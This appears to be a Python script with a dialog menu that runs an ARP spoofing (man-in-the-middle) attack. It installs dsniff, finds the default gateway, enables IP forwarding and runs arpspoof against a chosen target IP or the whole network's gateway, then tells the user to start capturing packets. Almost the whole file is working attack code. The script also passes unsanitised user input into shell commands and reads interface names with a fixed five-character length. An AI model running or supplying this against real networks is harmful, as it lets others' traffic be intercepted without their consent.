#!/usr/bin/python3
import os
os.system('dialog --msgbox "Welcome to ARP Sniffing" 10 30')
os.system('sleep 1')
os.system('apt-get install dsniff -y')
os.system('dialog --inputbox "enter the interface" 10 30 2> /tmp/interface' )
interface=open('/tmp/interface').read(5)
#for gateway
os.system('netstat -nr | grep UG > /tmp/gateway')
os.system('awk \'{print $2}\' /tmp/gateway  >/tmp/gateway2')
g=open('/tmp/gateway2')
gateway=g.read(15)
print(gateway)
def arp_sniff():
	os.system('dialog --menu  "choose options" 10 30 5 "1" "Sniff a single target" "2" "Sniff whole network" 2>  /tmp/choice')
	choice=open('/tmp/choice').read(2)
	if choice=='1' :
		os.system('dialog --inputbox "enter the target\'s ip address" 10 30 2> /tmp/target' )
		os.system('dialog --inputbox "enter the spoof ip address" 10 30 2> /tmp/destination' )
		target=open('/tmp/target').read(15)
		destination=open('/tmp/destination').read(15)
		os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
		#print(target)
		#print(destination)
		print('spoofing is now started please start capturing ur packets')
		os.system('arpspoof -i {} -t {} {}' .format(interface,target,destination))
		arp_sniff()
	elif choice =='2':
		print('reached here')
		print ('ur interface is:'+interface)
		print ('gateway is:'+gateway)
		print('spoofing is now started please start capturing ur packets')
		os.system('arpspoof -i {} {}' .format(interface,gateway))
		arp_sniff()
arp_sniff()
